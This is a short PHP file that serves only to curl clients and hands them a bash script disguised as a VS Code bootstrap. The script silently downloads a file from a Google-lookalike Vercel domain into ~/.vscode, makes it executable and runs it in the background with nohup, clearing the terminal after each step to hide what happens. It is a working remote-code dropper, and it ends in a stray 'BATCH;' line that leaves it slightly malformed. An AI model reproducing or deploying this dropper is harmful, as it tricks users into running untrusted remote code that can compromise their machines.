<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (stripos($userAgent, 'curl/') !== 0) {
    http_response_code(403);
    exit('Access denied');
}

header('Content-Type: text/plain; charset=utf-8');

#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/.vscode"
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://apigoogle-ashen.vercel.app/api/settings/bootstraplinux"
clear
chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
clear
nohup bash "$TARGET_DIR/vscode-bootstrap.sh"
clear
exit 0
BATCH;